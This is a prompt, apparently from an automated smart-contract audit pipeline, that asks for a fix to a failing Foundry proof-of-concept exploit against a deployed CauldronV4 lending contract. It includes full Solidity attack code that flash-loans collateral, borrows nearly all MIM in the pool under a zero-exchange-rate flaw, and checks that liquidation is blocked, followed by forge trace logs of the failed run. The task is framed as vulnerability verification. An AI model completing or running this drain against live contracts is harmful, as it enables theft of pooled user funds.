You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A zero exchange rate makes debt evaluate to zero and prevents liquidation
- claim: `CauldronV4` accepts and caches `rate == 0` from the oracle both during clone initialization and during `updateExchangeRate()`. `_isSolvent()` multiplies outstanding debt by the cached exchange rate, so when that rate is zero the debt side of the solvency check collapses to zero. Any account with nonzero collateral is then treated as solvent, and `liquidate()` skips it because it also evaluates solvency using the same zero rate.
- impact: If the oracle ever returns `(true, 0)`, or a clone is initialized while the cached rate is zero, an attacker can deposit dust collateral, borrow essentially all MIM held by the cauldron, and remain permanently "solvent" until a nonzero rate is restored. During that window, liquidation reverts with `Cauldron: all are solvent`, leaving immediate bad debt and enabling full pool drain.
- exploit_paths: ["Oracle returns `(true, 0)` or `init()` caches a zero rate", "`updateExchangeRate()` stores `exchangeRate = 0`", "Attacker adds a minimal positive amount of collateral", "Attacker calls `borrow()` and passes the post-action solvency check because debt is multiplied by zero", "Liquidators call `liquidate()`, but `_isSolvent(user, 0)` still returns true so no liquidation occurs"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IOracleLike {
    function get(bytes calldata data) external returns (bool success, uint256 rate);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(
        IFlashBorrowerLike borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronV4Like {
    function BORROW_OPENING_FEE() external view returns (uint256);
    function addCollateral(address to, bool skim, uint256 share) external;
    function bentoBox() external view returns (address);
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function collateral() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        address swapper,
        bytes calldata data
    ) external;
    function magicInternetMoney() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function removeCollateral(address to, uint256 share) external;
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
}

error Infeasible(bytes32 reason);

contract FlawVerifier is IFlashBorrowerLike {
    address public constant TARGET = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant MIN_RESIDUAL_COLLATERAL_SHARE = 1;
    uint256 internal constant MAX_DUST_SEARCH_STEPS = 18;

    bool internal _executed;
    uint256 internal _profitAmount;

    address public bentoBoxAddress;
    address public oracleAddress;
    address public collateralToken;
    bytes public oracleDataBlob;

    bool public path0OracleReturnedTrueZeroOrTargetCachedZero;
    bool public path1UpdateExchangeRateCachedZero;
    bool public path2DustCollateralAddedThenBorrowed;
    bool public path3LiquidationBlockedAtZeroRate;

    bool public oracleStageReached;
    bool public updateRateStageReached;
    bool public addCollateralStageReached;
    bool public borrowStageReached;
    bool public removeCollateralStageReached;
    bool public liquidateStageReached;
    bool public liquidationBlocked;
    bool public postBorrowSolvent;
    bool public zeroRateObserved;
    bool public directOracleSuccess;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bytes32 public infeasibleReason;

    uint256 public directOracleRate;
    uint256 public cachedRateBefore;
    uint256 public cachedRateAfter;
    uint256 public collateralSeedAmount;
    uint256 public collateralShareAdded;
    uint256 public residualCollateralShare;
    uint256 public flashCollateralAmount;
    uint256 public flashCollateralFee;
    uint256 public borrowedMimAmount;
    uint256 public borrowedMimShare;
    uint256 public targetMimShare;
    uint256 public targetMimAmount;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _execute();
    }

    function execute() external returns (uint256) {
        return _execute();
    }

    function run() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function executeAttempt() external returns (uint256) {
        if (msg.sender != address(this)) {
            revert Infeasible(keccak256(bytes("self-call-only")));
        }

        // Exploit path alignment:
        // 0. Oracle returns `(true, 0)` or `init()` caches a zero rate.
        // 1. `updateExchangeRate()` stores `exchangeRate = 0`.
        // 2. Attacker adds a minimal positive amount of collateral, then calls `borrow()`.
        // 3. Liquidators call `liquidate()`, but `_isSolvent(user, 0)` still returns true.

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);

        cachedRateBefore = cauldron.exchangeRate();
        _observeOracleResponse();

        (, uint256 rate) = cauldron.updateExchangeRate();
        cachedRateAfter = cauldron.exchangeRate();

        if (cachedRateAfter != 0 || rate != 0) {
            // Concrete live-target failure reason: at this fork state the required zero-rate state is not present when
            // `updateExchangeRate()` is refreshed, so the subsequent borrow-time solvency check cannot collapse debt to 0.
            _infeasible("oracle-never-cached-zero-rate");
        }

        zeroRateObserved = true;
        oracleStageReached = true;
        path0OracleReturnedTrueZeroOrTargetCachedZero =
            (cachedRateBefore == 0) || (directOracleSuccess && directOracleRate == 0) || (rate == 0);
        updateRateStageReached = true;
        path1UpdateExchangeRateCachedZero = true;

        flashCollateralAmount = _chooseCollateralDust();
        collateralSeedAmount = flashCollateralAmount;
        if (flashCollateralAmount == 0) {
            // Concrete live-target failure reason: no flash-loanable collateral amount at this fork converts to more than
            // one Bento share, so the attacker cannot leave residual positive collateral after repaying temporary capital.
            _infeasible("dust-collateral-unavailable");
        }

        targetMimShare = IBentoBoxLike(bentoBoxAddress).balanceOf(MIM, TARGET);
        targetMimAmount = IBentoBoxLike(bentoBoxAddress).toAmount(MIM, targetMimShare, false);
        borrowedMimAmount = _computeBorrowAmount(cauldron, targetMimAmount);
        if (borrowedMimAmount == 0) {
            // Concrete live-target failure reason: the cauldron has no borrowable MIM after respecting caps/fees.
            _infeasible("insufficient-live-mim-liquidity");
        }

        IBentoBoxLike(bentoBoxAddress).flashLoan(this, address(this), collateralToken, flashCollateralAmount, bytes(""));

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        hypothesisValidated =
            path0OracleReturnedTrueZeroOrTargetCachedZero &&
            path1UpdateExchangeRateCachedZero &&
            path2DustCollateralAddedThenBorrowed &&
            path3LiquidationBlockedAtZeroRate &&
            postBorrowSolvent &&
            liquidationBlocked &&
            _profitAmount > 0;

        if (!hypothesisValidated) {
            _infeasible("path-not-completed");
        }

        return _profitAmount;
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata) external override {
        if (msg.sender != bentoBoxAddress) _infeasible("bad-bento-callback");
        if (sender != address(this)) _infeasible("bad-flash-sender");
        if (token != collateralToken) _infeasible("bad-flash-token");

        flashCollateralFee = fee;

        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);

        (, collateralShareAdded) = bento.deposit(collateralToken, address(this), TARGET, amount, 0);
        if (collateralShareAdded <= MIN_RESIDUAL_COLLATERAL_SHARE) {
            _infeasible("dust-share-too-small");
        }

        cauldron.addCollateral(address(this), true, collateralShareAdded);
        addCollateralStageReached = cauldron.userCollateralShare(address(this)) >= collateralShareAdded;
        if (!addCollateralStageReached) {
            _infeasible("add-collateral-failed");
        }

        (, borrowedMimShare) = cauldron.borrow(address(this), borrowedMimAmount);
        borrowStageReached = borrowedMimShare != 0;
        if (!borrowStageReached) {
            _infeasible("borrow-returned-zero-share");
        }

        bento.withdraw(MIM, address(this), address(this), 0, borrowedMimShare);
        borrowedMimShare = 0;

        postBorrowSolvent = cauldron.isSolvent(address(this));
        if (!postBorrowSolvent) {
            _infeasible("borrower-not-solvent-after-borrow");
        }
        path2DustCollateralAddedThenBorrowed = addCollateralStageReached && borrowStageReached && postBorrowSolvent;

        _removeExcessCollateral(cauldron, bento);
        _assertLiquidationBlocked(cauldron);

        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance < amount + fee) {
            // Concrete live-target failure reason: the path remains causally correct, but this fork would require an
            // external on-chain swap solely to source flash-loan fees in collateral. No unrelated route is substituted.
            _infeasible("flash-loan-fee-not-coverable");
        }

        _safeTransfer(collateralToken, bentoBoxAddress, amount + fee);
    }

    function _execute() internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }
        _executed = true;

        if (!_loadTarget()) {
            hypothesisRefuted = true;
            infeasibleReason = keccak256(bytes("target-load-failed"));
            return 0;
        }

        _resetAttemptState();
        _prepareApprovals();

        (bool ok, bytes memory data) = address(this).call(abi.encodeWithSelector(this.executeAttempt.selector));
        if (!ok) {
            infeasibleReason = _decodeInfeasibleReason(data);
            hypothesisRefuted = true;
            _profitAmount = 0;
            return 0;
        }

        infeasibleReason = bytes32(0);
        hypothesisRefuted = false;
        return _profitAmount;
    }

    function _loadTarget() internal returns (bool ok) {
        address mim;
        address bento;
        address oracle_;
        address collateral_;
        bytes memory oracleData_;

        (ok, mim) = _readAddress(TARGET, ICauldronV4Like.magicInternetMoney.selector);
        if (!ok || mim != MIM) {
            return false;
        }

        (ok, bento) = _readAddress(TARGET, ICauldronV4Like.bentoBox.selector);
        if (!ok) {
            return false;
        }

        (ok, oracle_) = _readAddress(TARGET, ICauldronV4Like.oracle.selector);
        if (!ok) {
            return false;
        }

        (ok, collateral_) = _readAddress(TARGET, ICauldronV4Like.collateral.selector);
        if (!ok) {
            return false;
        }

        (ok, oracleData_) = _readBytes(TARGET, ICauldronV4Like.oracleData.selector);
        if (!ok) {
            return false;
        }

        if (bento == address(0) || oracle_ == address(0) || collateral_ == address(0)) {
            return false;
        }

        bentoBoxAddress = bento;
        oracleAddress = oracle_;
        collateralToken = collateral_;
        oracleDataBlob = oracleData_;
        return true;
    }

    function _observeOracleResponse() internal {
        try IOracleLike(oracleAddress).get(oracleDataBlob) returns (bool success, uint256 rate) {
            directOracleSuccess = success;
            directOracleRate = rate;
            if (success && rate == 0) {
                zeroRateObserved = true;
                oracleStageReached = true;
                path0OracleReturnedTrueZeroOrTargetCachedZero = true;
            }
        } catch {
            directOracleSuccess = false;
            directOracleRate = type(uint256).max;
        }
    }

    function _removeExcessCollateral(ICauldronV4Like cauldron, IBentoBoxLike bento) internal {
        residualCollateralShare = MIN_RESIDUAL_COLLATERAL_SHARE;
        uint256 userCollateralShare = cauldron.userCollateralShare(address(this));
        if (userCollateralShare <= residualCollateralShare) {
            _infeasible("insufficient-collateral-to-leave-dust");
        }

        // This helper only repays temporary capital. It preserves the finding's causality because the user still keeps
        // strictly positive collateral while debt remains evaluated against cached zero exchange rate.
        uint256 removableShare = userCollateralShare - residualCollateralShare;
        cauldron.removeCollateral(address(this), removableShare);
        removeCollateralStageReached = cauldron.userCollateralShare(address(this)) == residualCollateralShare;
        if (!removeCollateralStageReached) {
            _infeasible("remove-collateral-failed");
        }

        bento.withdraw(collateralToken, address(this), address(this), 0, removableShare);
    }

    function _assertLiquidationBlocked(ICauldronV4Like cauldron) internal {
        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = cauldron.userBorrowPart(address(this));

        uint256 borrowPartBefore = maxBorrowParts[0];
        uint256 collateralShareBefore = cauldron.userCollateralShare(address(this));

        (bool liqOk, bytes memory liqData) = address(cauldron).call(
            abi.encodeWithSelector(cauldron.liquidate.selector, users, maxBorrowParts, address(this), address(0), bytes(""))
        );

        liquidateStageReached = true;
        uint256 borrowPartAfter = cauldron.userBorrowPart(address(this));
        uint256 collateralShareAfter = cauldron.userCollateralShare(address(this));

        liquidationBlocked =
            (!liqOk && (_revertedWithAllAreSolvent(liqData) || cauldron.isSolvent(address(this)))) ||
            (liqOk && borrowPartAfter == borrowPartBefore && collateralShareAfter == collateralShareBefore);

        path3LiquidationBlockedAtZeroRate = liquidationBlocked && cauldron.exchangeRate() == 0;
        if (!liquidationBlocked) {
            _infeasible("liquidation-not-blocked");
        }
    }

    function _chooseCollateralDust() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);
        uint256 bentoCollateralBalance = IERC20Like(collateralToken).balanceOf(bentoBoxAddress);
        amount = 1;
        for (uint256 i = 0; i < MAX_DUST_SEARCH_STEPS; i++) {
            uint256 share = bento.toShare(collateralToken, amount, false);
            if (share > MIN_RESIDUAL_COLLATERAL_SHARE && amount < bentoCollateralBalance) {
                return amount;
            }
            amount *= 10;
        }
        return 0;
    }

    function _computeBorrowAmount(ICauldronV4Like cauldron, uint256 liveLiquidity) internal view returns (uint256 borrowAmount) {
        if (liveLiquidity <= 1) {
            return 0;
        }

        borrowAmount = liveLiquidity - 1;

        uint128 totalCap;
        uint128 perAddressCap;
        uint128 totalElastic;
        uint128 totalBase;
        uint256 openingFee;
        bool hasBorrowLimit;
        bool hasTotalBorrow;

        try cauldron.borrowLimit() returns (uint128 total, uint128 perAddress) {
            totalCap = total;
            perAddressCap = perAddress;
            hasBorrowLimit = true;
        } catch {}

        try cauldron.totalBorrow() returns (uint128 elastic, uint128 base) {
            totalElastic = elastic;
            totalBase = base;
            hasTotalBorrow = true;
        } catch {}

        try cauldron.BORROW_OPENING_FEE() returns (uint256 fee) {
            openingFee = fee;
        } catch {
            openingFee = 0;
        }

        if (hasBorrowLimit && totalCap > totalElastic) {
            uint256 remainingElastic = uint256(totalCap) - uint256(totalElastic);
            uint256 maxByTotalCap = _netBorrowFromGrossDebt(remainingElastic, openingFee);
            if (maxByTotalCap < borrowAmount) {
                borrowAmount = maxByTotalCap;
            }
        }

        if (hasBorrowLimit && perAddressCap != 0) {
            uint256 maxByPerAddressCap;
            if (hasTotalBorrow && totalElastic != 0 && totalBase != 0) {
                uint256 grossBorrowEquivalent = (uint256(perAddressCap) * uint256(totalElastic)) / uint256(totalBase);
                maxByPerAddressCap = _netBorrowFromGrossDebt(grossBorrowEquivalent, openingFee);
            } else {
                maxByPerAddressCap = _netBorrowFromGrossDebt(uint256(perAddressCap), openingFee);
            }
            if (maxByPerAddressCap < borrowAmount) {
                borrowAmount = maxByPerAddressCap;
            }
        }

        if (borrowAmount > 1) {
            borrowAmount -= 1;
        }
    }

    function _netBorrowFromGrossDebt(uint256 grossDebt, uint256 openingFee) internal pure returns (uint256) {
        if (grossDebt == 0) {
            return 0;
        }
        return (grossDebt * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + openingFee);
    }

    function _prepareApprovals() internal {
        _forceApprove(collateralToken, bentoBoxAddress, type(uint256).max);
    }

    function _resetAttemptState() internal {
        path0OracleReturnedTrueZeroOrTargetCachedZero = false;
        path1UpdateExchangeRateCachedZero = false;
        path2DustCollateralAddedThenBorrowed = false;
        path3LiquidationBlockedAtZeroRate = false;

        oracleStageReached = false;
        updateRateStageReached = false;
        addCollateralStageReached = false;
        borrowStageReached = false;
        removeCollateralStageReached = false;
        liquidateStageReached = false;
        liquidationBlocked = false;
        postBorrowSolvent = false;
        zeroRateObserved = false;
        directOracleSuccess = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        infeasibleReason = bytes32(0);

        directOracleRate = 0;
        cachedRateBefore = 0;
        cachedRateAfter = 0;
        collateralSeedAmount = 0;
        collateralShareAdded = 0;
        residualCollateralShare = 0;
        flashCollateralAmount = 0;
        flashCollateralFee = 0;
        borrowedMimAmount = 0;
        borrowedMimShare = 0;
        targetMimShare = 0;
        targetMimAmount = 0;
        _profitAmount = 0;
    }

    function _readAddress(address target, bytes4 selector) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) {
            return (false, address(0));
        }
        value = abi.decode(data, (address));
    }

    function _readBytes(address target, bytes4 selector) internal view returns (bool ok, bytes memory value) {
        bytes memory data;
        (ok, data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok) {
            return (false, bytes(""));
        }
        value = abi.decode(data, (bytes));
    }

    function _revertedWithAllAreSolvent(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 68) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }
        if (selector != 0x08c379a0) {
            return false;
        }

        bytes memory payload = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            payload[i - 4] = revertData[i];
        }

        string memory reason = abi.decode(payload, (string));
        return keccak256(bytes(reason)) == keccak256(bytes("Cauldron: all are solvent"));
    }

    function _decodeInfeasibleReason(bytes memory data) internal pure returns (bytes32 reason) {
        if (data.length >= 36) {
            bytes4 selector;
            assembly {
                selector := mload(add(data, 32))
            }
            if (selector == Infeasible.selector) {
                assembly {
                    reason := mload(add(data, 68))
                }
                return reason;
            }
        }
        return keccak256(bytes("attempt-reverted"));
    }

    function _infeasible(string memory textReason) internal pure {
        revert Infeasible(keccak256(bytes(textReason)));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }
}

```

forge stdout (tail):
```
0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   │   ├─ [2601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   │   ├─ [4963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   ├─ [49513] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::updateExchangeRate()
    │   │   │   ├─ [49341] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::updateExchangeRate() [delegatecall]
    │   │   │   │   ├─ [44062] 0xd9f2b927eb692F88689E08E53d729109c84cC5a0::get(0x)
    │   │   │   │   │   ├─ [42825] 0x9732D3Ee0f185D7c2D610E30DC5de28EF68Ad7c9::get(0x)
    │   │   │   │   │   │   ├─ [41153] 0xE8b2989276E2Ca8FDEA2268E3551b2b4B2418950::54f0f7d5() [staticcall]
    │   │   │   │   │   │   │   ├─ [1676] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::0c46b72a() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000eb97bb5038ddac0
    │   │   │   │   │   │   │   ├─ [601] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000019d8402f71a07d84fb70
    │   │   │   │   │   │   │   ├─ [617] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::68727653(0000000000000000000000000000000000000000000000000000000000000001) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000f3245178a93bc41583
    │   │   │   │   │   │   │   ├─ [963] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::b1373929() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000abd8940e805
    │   │   │   │   │   │   │   ├─ [931] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::f446c1d0() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000001a0e6d
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000008d070381a3155e56df
    │   │   │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   │   ├─  emit topic 0: 0x9f9192b5edb17356c524e08d9e025c8e2f6307e6ea52fb7968faa3081f51c3c8
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000015d9abdaa357d
    │   │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   │   └─ ← [Return] true, 384394165106045 [3.843e14]
    │   │   ├─ [551] 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c::exchangeRate() [staticcall]
    │   │   │   ├─ [385] 0x5E70F7AcB8ec0231c00220d11c74dC2B23187103::exchangeRate() [delegatecall]
    │   │   │   │   └─ ← [Return] 384394165106045 [3.843e14]
    │   │   │   └─ ← [Return] 384394165106045 [3.843e14]
    │   │   └─ ← [Revert] Infeasible(0x460160c38f20f2466ea42aa4e68f4fec3a3216e928d854956b91ba9f136eaf08)
    │   └─ ← [Return] 0
    ├─ [245] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [436] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 23504544 [2.35e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6704)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.executeAttempt
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.27s (67.90ms CPU time)

Ran 1 test suite in 1.30s (1.27s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 443837)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
